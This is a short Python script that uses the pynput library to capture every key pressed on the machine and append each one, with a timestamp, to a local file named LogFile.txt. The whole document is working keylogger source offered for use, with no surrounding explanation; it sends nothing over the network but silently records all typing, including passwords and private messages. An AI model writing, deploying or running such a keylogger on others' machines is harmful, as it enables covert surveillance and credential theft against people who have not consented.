import os
import time
import pynput
# You need to install it first ...

logFile = "LogFile.txt"
if not os.path.exists(logFile):
    with open(logFile, "w") as makeFile:
        pass

def thePress(key):
        theTime = time.strftime("%Y.%m.%d , %H:%M:%S")
        with open (logFile, "a") as appendFile:
           appendFile.write(f"{str(key)} pressed at {theTime} \n")


def keyReconizer ():
    listen = pynput.keyboard.Listener(on_press=thePress)
    listen.start()
    listen.join()


keyReconizer()